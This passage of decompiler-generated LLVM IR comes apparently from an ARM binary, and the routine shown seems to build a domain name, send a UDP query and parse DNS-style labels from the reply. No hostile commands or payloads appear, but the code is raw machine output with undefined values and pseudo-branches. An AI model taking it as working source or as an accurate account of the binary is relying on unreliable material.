  %v5_167d0 = inttoptr i32 %v4_167d0 to i8*
  %v1_16a34.cmp = icmp ugt i32 %v1_16a34, 1
  %v2_16a6c = icmp eq i32 %tmp160, 0
  %v3_16c98 = icmp ugt i32 %v0_16678, 27
  %v8_16c98 = icmp eq i32 %v0_16678, 28
  br label %dec_label_pc_16760

dec_label_pc_16760:                               ; preds = %dec_label_pc_16da8, %dec_label_pc_166e8
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_166e8 ], [ %v1_16dac, %dec_label_pc_16da8 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_166e8 ], [ %v3_16874, %dec_label_pc_16da8 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_166e8 ], [ %stack_var_-468.2, %dec_label_pc_16da8 ]
  %v1_16768 = phi i32 [ -1, %dec_label_pc_166e8 ], [ %v3_16948, %dec_label_pc_16da8 ]
  store i32 %v1_16768, i32* %r3.global-to-local, align 4
  %v2_16764 = icmp eq i32 %v1_16768, -1
  store i1 %v2_16764, i1* %cpsr_c.global-to-local, align 1
  %v7_16764 = icmp eq i32 %v1_16768, -1
  br i1 %v7_16764, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_16760
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_16760, %bb215
  %v1_1676c = xor i1 %v7_16764, true
  call void @__pseudo_cond_branch(i1 %v1_1676c, i32 ptrtoint (i32* @global_var_d088.669 to i32))
  store i32 36, i32* @r7, align 4
  %v0_16778 = load i32, i32* @r8, align 4
  %v2_16778 = add i32 %v0_16778, 40
  %v3_16778 = inttoptr i32 %v2_16778 to i32*
  %v4_16778 = load i32, i32* %v3_16778, align 4
  store i32 %v4_16778, i32* @r4, align 4
  store i32 %v2_1677c, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_16788 = add i32 %v0_16778, 36
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  %v4_16788 = load i32, i32* %v3_16788, align 4
  store i32 %v4_16788, i32* %r1.global-to-local, align 4
  %v2_16790 = add i32 %v0_16778, 76
  %v3_16790 = inttoptr i32 %v2_16790 to i32*
  %v4_16790 = load i32, i32* %v3_16790, align 4
  store i32 %v4_16790, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16790)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_167a4 = load i32, i32* @r8, align 4
  %v2_167a4 = add i32 %v0_167a4, 16
  %v3_167a4 = inttoptr i32 %v2_167a4 to i32*
  %v4_167a4 = load i32, i32* %v3_167a4, align 4
  store i32 %v4_167a4, i32* %ip.global-to-local, align 4
  store i32 92080, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_167a4)
  %v0_167b0 = call i32 @function_16ef8()
  %v0_167b8 = load i32, i32* @r8, align 4
  %v2_167b8 = add i32 %v0_167b8, 12324
  %v3_167b8 = inttoptr i32 %v2_167b8 to i32*
  %v4_167b8 = load i32, i32* %v3_167b8, align 4
  store i32 %v1_166c0, i32* %r3.global-to-local, align 4
  store i32 %v0_1668c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_167c8 = load i32, i32* @sb, align 4
  %v3_167c8 = icmp uge i32 %v0_167c8, %v4_167b8
  store i1 %v3_167c8, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_167d0, align 1
  %v0_167d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167d4, label %dec_label_pc_16800, label %dec_label_pc_167d8

dec_label_pc_167d8:                               ; preds = %bb216
  %v3_167e0 = load i32, i32* %ip.global-to-local, align 4
  %v4_167e0 = add i32 %v3_167e0, %v1_166c0
  %v5_167e0 = inttoptr i32 %v4_167e0 to i8*
  store i8 46, i8* %v5_167e0, align 1
  store i32 12312, i32* %r1.global-to-local, align 4
  %v4_167ec = load i32, i32* @global_var_25e8c.670, align 4
  store i32 %v4_167ec, i32* %r3.global-to-local, align 4
  %v1_167f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_167f4 = add i32 %v1_167f0, %v1_167f4
  %v1_167f8 = load i32, i32* @sb, align 4
  %v2_167f8 = and i32 %v1_167f8, 1073741824
  %v3_167f8 = icmp ne i32 %v2_167f8, 0
  store i1 %v3_167f8, i1* %cpsr_c.global-to-local, align 1
  %v4_167f8 = mul i32 %v1_167f8, 4
  %v5_167f8 = add i32 %v4_167f8, %v4_167ec
  %v6_167f8 = inttoptr i32 %v5_167f8 to i32*
  %v7_167f8 = load i32, i32* %v6_167f8, align 4
  store i32 %v7_167f8, i32* @r1, align 4
  %v2_167fc = inttoptr i32 %v2_167f4 to i8*
  %v3_167fc = call i32 @function_f8ec(i8* %v2_167fc, i32 %v7_167f8)
  br label %dec_label_pc_16800

dec_label_pc_16800:                               ; preds = %bb216, %dec_label_pc_167d8
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16804 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_16804, label %dec_label_pc_1680c, label %dec_label_pc_16800.dec_label_pc_1683c_crit_edge

dec_label_pc_16800.dec_label_pc_1683c_crit_edge:  ; preds = %dec_label_pc_16800
  %v0_16844.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1683c

dec_label_pc_1680c:                               ; preds = %dec_label_pc_16800
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 935, i32* %ip.global-to-local, align 4
  %v0_16814 = load i32, i32* @r8, align 4
  %v2_16814 = add i32 %v0_16814, 12320
  %v3_16814 = inttoptr i32 %v2_16814 to i32*
  %v4_16814 = load i32, i32* %v3_16814, align 4
  %v2_16818 = add i32 %v0_16814, 935
  %v3_16818 = inttoptr i32 %v2_16818 to i8*
  %v4_16818 = load i8, i8* %v3_16818, align 1
  %v6_16818 = zext i8 %v4_16818 to i32
  %v2_1681c = mul i32 %v6_16818, %v4_16814
  store i32 %v2_1681c, i32* %r3.global-to-local, align 4
  store i32 10756, i32* %r1.global-to-local, align 4
  %v2_16828 = add i32 %v0_16814, 932
  %v3_16828 = inttoptr i32 %v2_16828 to i16*
  %v4_16828 = load i16, i16* %v3_16828, align 2
  %v6_16828 = zext i16 %v4_16828 to i32
  %v4_1682c = load i32, i32* @global_var_25878.671, align 4
  store i32 %v4_1682c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1683c

dec_label_pc_1683c:                               ; preds = %dec_label_pc_16800.dec_label_pc_1683c_crit_edge, %dec_label_pc_1680c
  %v2_16880 = phi i32 [ %v0_16814, %dec_label_pc_1680c ], [ %v0_16844.pre, %dec_label_pc_16800.dec_label_pc_1683c_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_16828, %dec_label_pc_1680c ], [ %stack_var_-464.0, %dec_label_pc_16800.dec_label_pc_1683c_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1682c, %dec_label_pc_1680c ], [ %stack_var_-468.0, %dec_label_pc_16800.dec_label_pc_1683c_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1681c, %dec_label_pc_1680c ], [ %stack_var_-476.0, %dec_label_pc_16800.dec_label_pc_1683c_crit_edge ]
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_16844 = add i32 %v2_16880, 12320
  %v3_16844 = inttoptr i32 %v2_16844 to i32*
  %v4_16844 = load i32, i32* %v3_16844, align 4
  %v3_1684c = icmp uge i32 %stack_var_-468.1, %v4_16844
  store i1 %v3_1684c, i1* %cpsr_c.global-to-local, align 1
  %v4_16850 = load i32, i32* @global_var_25e90.674, align 4
  store i32 %v4_16850, i32* %r3.global-to-local, align 4
  br i1 %v3_1684c, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1683c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1683c, %bb217
  %v0_1685c = phi i32 [ %stack_var_-468.1, %dec_label_pc_1683c ], [ 0, %bb217 ]
  %v3_1685c = mul i32 %v0_1685c, 28
  %v4_1685c = add i32 %v3_1685c, %v4_16850
  store i32 %v4_1685c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_16868 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_16874 = urem i32 %v1_16868, 65536
  store i32 10756, i32* %r1.global-to-local, align 4
  %v1_16880 = trunc i32 %v1_16868 to i16
  %v4_16880 = add i32 %v2_16880, 932
  %v5_16880 = inttoptr i32 %v4_16880 to i16*
  store i16 %v1_16880, i16* %v5_16880, align 2
  store i32 %v0_1685c, i32* @global_var_25878.671, align 4
  %v0_1688c = load i32, i32* %r3.global-to-local, align 4
  %v1_16890 = inttoptr i32 %v0_1688c to i32*
  %v2_16890 = load i32, i32* %v1_16890, align 4
  %v3_16890 = add i32 %v0_1688c, 4
  %v4_16890 = inttoptr i32 %v3_16890 to i32*
  %v5_16890 = load i32, i32* %v4_16890, align 4
  store i32 %v5_16890, i32* %r1.global-to-local, align 4
  %v9_16890 = add i32 %v0_1688c, 12
  %v10_16890 = inttoptr i32 %v9_16890 to i32*
  %v11_16890 = load i32, i32* %v10_16890, align 4
  store i32 %v11_16890, i32* %r3.global-to-local, align 4
  %v12_16890 = add i32 %v0_1688c, 16
  %v4_16898 = trunc i32 %v2_16890 to i16
  store i16 %v4_16898, i16* %stack_var_-104, align 2
  store i32 %v15_16898, i32* %ip.global-to-local, align 4
  %v1_1689c = inttoptr i32 %v12_16890 to i32*
  %v2_1689c = load i32, i32* %v1_1689c, align 4
  %v3_1689c = add i32 %v0_1688c, 20
  %v4_1689c = inttoptr i32 %v3_1689c to i32*
  %v5_1689c = load i32, i32* %v4_1689c, align 4
  store i32 %v5_1689c, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_1689c, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_168b0 = load i32, i32* @r8, align 4
  %v2_168b0 = add i32 %v0_168b0, 24
  %v3_168b0 = inttoptr i32 %v2_168b0 to i32*
  %v4_168b0 = load i32, i32* %v3_168b0, align 4
  store i32 %v4_168b0, i32* %ip.global-to-local, align 4
  store i32 92348, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_168b0)
  store i32 %v2_168bc, i32* @r6, align 4
  %v0_168c0 = load i32, i32* @r7, align 4
  store i32 %v0_168c0, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_168c8 = load i32, i32* @sl, align 4
  %v2_168cc = inttoptr i32 %v0_168c8 to i8*
  %v3_168cc = call i32 @function_f5d0(i8* %v2_168cc, i32 %v0_168c0)
  %v0_168d0 = load i32, i32* @r7, align 4
  store i32 %v0_168d0, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_168dc = call i32 @function_f5d0(i8* %v2_168dc, i32 %v0_168d0)
  store i32 %v3_16874, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_168ec = load i32, i32* @sl, align 4
  store i32 %v0_168ec, i32* %r1.global-to-local, align 4
  store i32 %v3_16874, i32* %stack_var_-192, align 4
  %v6_16900 = call i32 @function_17920(i32* nonnull %stack_var_-192, i32 %v0_168ec, i32 512, i32 %v3_16874, i32 %v3_16874)
  store i32 %v6_16900, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16904 = icmp slt i32 %v6_16900, 0
  br i1 %v1_16904, label %dec_label_pc_16dc0, label %dec_label_pc_1690c

dec_label_pc_1690c:                               ; preds = %bb218
  store i32 %v0_16678, i32* @ip, align 4
  store i32 %v1_166c0, i32* @r5, align 4
  %v0_1691c = load i32, i32* @sl, align 4
  %v2_1691c = add i32 %v0_1691c, %v6_16900
  store i32 %v2_1691c, i32* %r1.global-to-local, align 4
  %v1_16920 = sub i32 512, %v6_16900
  store i32 %v1_166c0, i32* %stack_var_-60, align 4
  store i32 %v0_16678, i32* %stack_var_-56, align 4
  %v4_1692c = call i32 @function_17ac0(i32* nonnull %stack_var_-60, i32 %v2_1691c, i32 %v1_16920)
  store i32 %v4_1692c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16930 = icmp slt i32 %v4_1692c, 0
  br i1 %v1_16930, label %dec_label_pc_16dc0, label %dec_label_pc_16938

dec_label_pc_16938:                               ; preds = %dec_label_pc_1690c
  %v3_1693c = load i16, i16* %stack_var_-104, align 2
  %v4_1693c = sext i16 %v3_1693c to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_16948 = call i32 @function_10044(i32 %v4_1693c, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1694c = icmp slt i32 %v3_16948, 0
  br i1 %v1_1694c, label %dec_label_pc_16d98, label %dec_label_pc_16958

dec_label_pc_16958:                               ; preds = %dec_label_pc_16938
  store i32 %v2_16894, i32* %r1.global-to-local, align 4
  %v3_16960 = call i32 @function_ff1c(i32 %v3_16948, i32 %v2_16894, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16964 = icmp slt i32 %v3_16960, 0
  br i1 %v1_16964, label %dec_label_pc_16d98, label %dec_label_pc_1696c

dec_label_pc_1696c:                               ; preds = %dec_label_pc_16958
  %v0_1696c = load i32, i32* @r5, align 4
  %v1_1696c = load i32, i32* @r4, align 4
  %v2_1696c = add i32 %v1_1696c, %v0_1696c
  %v0_16970 = load i32, i32* @r7, align 4
  store i32 %v0_16970, i32* %r3.global-to-local, align 4
  %v0_16978 = load i32, i32* @sl, align 4
  store i32 %v0_16978, i32* %r1.global-to-local, align 4
  %v4_1697c = call i32 @function_17730(i32 %v3_16948, i32 %v0_16978, i32 %v2_1696c, i32 %v0_16970)
  store i32 934, i32* %r3.global-to-local, align 4
  %v0_16984 = load i32, i32* @r8, align 4
  %v2_16984 = add i32 %v0_16984, 934
  %v3_16984 = inttoptr i32 %v2_16984 to i8*
  %v4_16984 = load i8, i8* %v3_16984, align 1
  %v6_16984 = zext i8 %v4_16984 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1698c = mul nuw nsw i32 %v6_16984, 1000
  store i32 %v2_1698c, i32* @r4, align 4
  store i32 %v2_16990, i32* @r5, align 4
  br label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %thread-pre-split, %dec_label_pc_1696c
  %v0_169a0 = phi i32 [ %v1_169e0, %thread-pre-split ], [ %v2_1698c, %dec_label_pc_1696c ]
  store i32 %v3_16948, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1699c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_16948, i32* %stack_var_-48, align 4
  %v7_169b4 = call i32 @function_17768(i32 %v2_16990, i32 1, i32 %v0_169a0, i32 %v3_16948, i32 %v3_16948, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_169bc = load i32, i32* @sl, align 4
  store i32 %v0_169bc, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_169b4, 1
  br i1 %tmp219, label %dec_label_pc_16d98, label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_16994
  %v4_169d0 = call i32 @function_ff88(i32 %v3_16948, i32 %v0_169bc, i32 512, i32 64)
  %v2_169d4 = icmp ugt i32 %v4_169d0, 10
  store i1 %v2_169d4, i1* %cpsr_c.global-to-local, align 1
  %v8_169dc = icmp sgt i32 %v4_169d0, 11
  br i1 %v8_169dc, label %dec_label_pc_16a08, label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_16a08, %dec_label_pc_16a24, %dec_label_pc_169d0
  %v0_169e0 = load i32, i32* @r4, align 4
  %v1_169e0 = add i32 %v0_169e0, -1000
  store i32 %v1_169e0, i32* @r4, align 4
  %v7_169e0 = icmp eq i32 %v0_169e0, 1000
  %tmp283 = zext i1 %v7_169e0 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_169f0 = icmp slt i32 %v4_169d0, 0
  br i1 %v1_169f0, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_169e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16d98

thread-pre-split:                                 ; preds = %dec_label_pc_169e0
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_169e0, label %dec_label_pc_16d98, label %dec_label_pc_16994

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169d0
  store i32 %v2_168bc, i32* %r1.global-to-local, align 4
  %v0_16a0c = load i32, i32* @sl, align 4
  %v2_16a10 = inttoptr i32 %v0_16a0c to i8*
  %v3_16a10 = call i32 @function_17a0c(i8* %v2_16a10, i32 %v2_168bc)
  %v3_16a14 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_16a14, i32* %r3.global-to-local, align 4
  store i32 %v3_16874, i32* %r1.global-to-local, align 4
  %v3_16a1c = icmp uge i32 %v3_16a14, %v3_16874
  store i1 %v3_16a1c, i1* %cpsr_c.global-to-local, align 1
  %v9_16a1c = icmp eq i32 %v3_16a14, %v3_16874
  br i1 %v9_16a1c, label %dec_label_pc_16a24, label %dec_label_pc_169e0

dec_label_pc_16a24:                               ; preds = %dec_label_pc_16a08
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16a28, label %dec_label_pc_169e0, label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a24
  store i32 %v1_16a34, i32* %r3.global-to-local, align 4
  store i1 %v2_16a38, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_16a34.cmp, label %dec_label_pc_16a6c, label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a30
  store i1 %v2_16a44, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16a44, label %dec_label_pc_16a60, label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a40
  store i32 %v4_167b8, i32* @r5, align 4
  %v1_16a50 = add i32 %v4_167b8, -1
  store i32 %v1_16a50, i32* %r3.global-to-local, align 4
  %v0_16a54 = load i32, i32* @sb, align 4
  %v3_16a54 = icmp uge i32 %v0_16a54, %v1_16a50
  store i1 %v3_16a54, i1* %cpsr_c.global-to-local, align 1
  %v5_16a58 = icmp slt i32 %v0_16a54, %v1_16a50
  br i1 %v5_16a58, label %.thread7, label %dec_label_pc_16a60

.thread7:                                         ; preds = %dec_label_pc_16a4c
  %v7_16a58 = add i32 %v0_16a54, 1
  br label %dec_label_pc_16da8

dec_label_pc_16a60:                               ; preds = %dec_label_pc_16a4c, %dec_label_pc_16a40
  %v0_16a60 = call i32 @function_1331c()
  br label %dec_label_pc_16a94

dec_label_pc_16a6c:                               ; preds = %dec_label_pc_16a30
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16a6c, label %dec_label_pc_16a74, label %dec_label_pc_16d98

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a6c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_16a8c, label %dec_label_pc_16a9c

dec_label_pc_16a8c:                               ; preds = %dec_label_pc_16a74
  %v0_16a8c = call i32 @function_1331c()
  br label %dec_label_pc_16a94

dec_label_pc_16a94:                               ; preds = %dec_label_pc_16a60, %dec_label_pc_16a8c
  %storemerge2 = phi i32 [ %v0_16a8c, %dec_label_pc_16a8c ], [ %v0_16a60, %dec_label_pc_16a60 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_16a8c ], [ 1, %dec_label_pc_16a60 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_16a94 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_16a94, align 4
  br label %dec_label_pc_16de0

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a74
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_16aa0.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_16aa0 = add i32 %v0_16aa0.pre, 12
  store i32 %v2_16aa0, i32* @r4, align 4
  %v3_16aa0 = icmp ugt i32 %v0_16aa0.pre, -13
  store i1 %v3_16aa0, i1* %cpsr_c.global-to-local, align 1
  %v9_16aa0 = icmp eq i32 %v2_16aa0, 0
  br i1 %v9_16aa0, label %dec_label_pc_16d98, label %dec_label_pc_16aa8

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16a9c
  %v2_16aac = add i32 %v4_169d0, -12
  store i32 %v2_16aac, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_16aac, 1
  br i1 %tmp223, label %dec_label_pc_16d98, label %dec_label_pc_16abc

dec_label_pc_16ab4thread-pre-split:               ; preds = %dec_label_pc_16ad8
  %v2_16ae415 = add i32 %v2_16ac8, -1
  store i32 %v2_16ae415, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_16ae415, 1
  br i1 %tmp224, label %dec_label_pc_16d98, label %dec_label_pc_16abc

dec_label_pc_16abc:                               ; preds = %dec_label_pc_16aa8, %dec_label_pc_16ab4thread-pre-split
  %v1_16ae0 = phi i32 [ %v2_16ae415, %dec_label_pc_16ab4thread-pre-split ], [ %v2_16aac, %dec_label_pc_16aa8 ]
  %v0_16abc = phi i32 [ %v2_16ad0, %dec_label_pc_16ab4thread-pre-split ], [ %v2_16aa0, %dec_label_pc_16aa8 ]
  %v1_16abc = inttoptr i32 %v0_16abc to i8*
  %v2_16abc = load i8, i8* %v1_16abc, align 1
  %v3_16abc = zext i8 %v2_16abc to i32
  store i32 %v3_16abc, i32* %r3.global-to-local, align 4
  %v5_16abc = add i32 %v0_16abc, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ac0 = icmp eq i8 %v2_16abc, 0
  %v2_16ac8 = sub i32 %v1_16ae0, %v3_16abc
  store i32 %v2_16ac8, i32* @lr, align 4
  %v1_16acc = and i32 %v3_16abc, 192
  store i32 %v1_16acc, i32* @ip, align 4
  %v2_16ad0 = add i32 %v3_16abc, %v5_16abc
  br i1 %v2_16ac0, label %dec_label_pc_16aec, label %dec_label_pc_16ad8

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16abc
  %v2_16ad8 = icmp eq i32 %v1_16acc, 192
  store i1 %v2_16ad8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_16ad8, label %.thread9, label %dec_label_pc_16ab4thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_16ad8
  %v2_16adc = add i32 %v0_16abc, 2
  %v2_16ae0 = add i32 %v1_16ae0, -2
  store i32 %v2_16ae0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16aec

dec_label_pc_16aec:                               ; preds = %dec_label_pc_16abc, %.thread9
  %v1_16af8 = phi i32 [ %v2_16adc, %.thread9 ], [ %v5_16abc, %dec_label_pc_16abc ]
  %v0_16aec = phi i32 [ %v2_16ae0, %.thread9 ], [ %v1_16ae0, %dec_label_pc_16abc ]
  %v1_16aec = add i32 %v0_16aec, -3
  %v2_16aec = icmp ugt i32 %v0_16aec, 2
  store i1 %v2_16aec, i1* %cpsr_c.global-to-local, align 1
  %v3_16aec = sub i32 2, %v0_16aec
  %v4_16aec = and i32 %v3_16aec, %v0_16aec
  %v5_16aec = icmp slt i32 %v4_16aec, 0
  %v6_16aec = icmp slt i32 %v1_16aec, 0
  %v7_16aec = icmp eq i32 %v0_16aec, 3
  %v3_16af0 = xor i1 %v6_16aec, %v5_16aec
  %v4_16af0 = or i1 %v7_16aec, %v3_16af0
  br i1 %v4_16af0, label %dec_label_pc_16d98, label %dec_label_pc_16af4

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16aec
  %v1_16af4 = sub i32 -8, %v0_16aa0.pre
  %v2_16af8 = add i32 %v1_16af8, %v1_16af4
  store i32 %v2_16af8, i32* %r3.global-to-local, align 4
  %v3_16af8 = icmp ult i32 %v2_16af8, %v1_16af4
  store i1 %v3_16af8, i1* %cpsr_c.global-to-local, align 1
  %v8_16af8 = icmp slt i32 %v2_16af8, 0
  br i1 %v8_16af8, label %dec_label_pc_16d98, label %dec_label_pc_16b1c

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16af4
  %v2_16b04 = add i32 %v2_16af8, 12
  store i32 %v2_16b04, i32* %r1.global-to-local, align 4
  store i32 %v2_16b24, i32* @r5, align 4
  store i32 %v2_16b28, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_16d6c56, label %dec_label_pc_16b40, label %dec_label_pc_16d70

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16b1c, %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge
  %v0_16b44 = phi i32 [ %v0_16b44.pre, %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge ], [ %v0_16aa0.pre, %dec_label_pc_16b1c ]
  %stack_var_-460.364 = phi i32 [ %v2_16d50, %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge ], [ %v2_16b04, %dec_label_pc_16b1c ]
  %stack_var_-452.061 = phi i32 [ %v1_16d54, %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge ], [ 0, %dec_label_pc_16b1c ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_16d48.dec_label_pc_16b40_crit_edge ], [ 1, %dec_label_pc_16b1c ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_16b24, i32* %r3.global-to-local, align 4
  %v5_16b58 = call i32 @function_1656c(i32 %v0_16b44, i32 %stack_var_-460.364, i32 %v4_169d0, i32 %v2_16b24, i32 256)
  store i32 %v5_16b58, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16b5c = icmp slt i32 %v5_16b58, 0
  br i1 %v1_16b5c, label %dec_label_pc_16c2c, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16b40
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_16b6c = add i32 %v5_16b58, 10
  store i32 %v1_16b6c, i32* @sb, align 4
  %v2_16b70 = sub i32 %v4_169d0, %stack_var_-460.364
  %v2_16b74 = sub i32 %v2_16b70, %v1_16b6c
  store i32 %v2_16b74, i32* %r3.global-to-local, align 4
  %v3_16b74 = icmp uge i32 %v2_16b70, %v1_16b6c
  store i1 %v3_16b74, i1* %cpsr_c.global-to-local, align 1
  %v8_16b74 = icmp slt i32 %v2_16b74, 0
  br i1 %v8_16b74, label %dec_label_pc_16c24.thread, label %dec_label_pc_16b84

dec_label_pc_16c24.thread:                        ; preds = %dec_label_pc_16b64
  store i32 %v2_16b74, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16c2c

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b64
  %v1_16b88 = call i32 @function_fb80(i32 %v2_16b24)
  %v0_16b90 = load i32, i32* @r4, align 4
  %v2_16b90 = add i32 %v0_16b90, %stack_var_-460.364
  %v0_16b94 = load i32, i32* @sl, align 4
  %v2_16b94 = add i32 %v0_16b94, %v2_16b90
  store i32 %v2_16b94, i32* %r1.global-to-local, align 4
  %v1_16b98 = add i32 %v2_16b94, 2
  store i32 %v1_16b98, i32* %ip.global-to-local, align 4
  %v1_16b9c = add i32 %v2_16b94, 4
  store i32 %v1_16b9c, i32* %r3.global-to-local, align 4
  %v1_16ba0 = add i32 %v2_16b94, 5
  %v2_16ba0 = inttoptr i32 %v1_16ba0 to i8*
  %v3_16ba0 = load i8, i8* %v2_16ba0, align 1
  %v4_16ba0 = zext i8 %v3_16ba0 to i32
  %v1_16ba8 = add i32 %v2_16b94, 8
  %v2_16ba8 = inttoptr i32 %v1_16ba8 to i8*
  %v3_16ba8 = load i8, i8* %v2_16ba8, align 1
  %v4_16ba8 = zext i8 %v3_16ba8 to i32
  %v1_16bb4 = add i32 %v2_16b94, 6
  %v2_16bb4 = inttoptr i32 %v1_16bb4 to i8*
  %v3_16bb4 = load i8, i8* %v2_16bb4, align 1
  %v4_16bb4 = zext i8 %v3_16bb4 to i32
  store i32 %v4_16bb4, i32* %r3.global-to-local, align 4
  %v1_16bb8 = add i32 %v2_16b94, 9
  %v2_16bb8 = inttoptr i32 %v1_16bb8 to i8*
  %v3_16bb8 = load i8, i8* %v2_16bb8, align 1
  %v4_16bb8 = zext i8 %v3_16bb8 to i32
  %v3_16bc0 = inttoptr i32 %v2_16b94 to i8*
  %v4_16bc0 = load i8, i8* %v3_16bc0, align 1
  %v6_16bc0 = zext i8 %v4_16bc0 to i32
  %v1_16bc4 = add i32 %v2_16b94, 3
  %v2_16bc4 = inttoptr i32 %v1_16bc4 to i8*
  %v3_16bc4 = load i8, i8* %v2_16bc4, align 1
  %v4_16bc4 = zext i8 %v3_16bc4 to i32
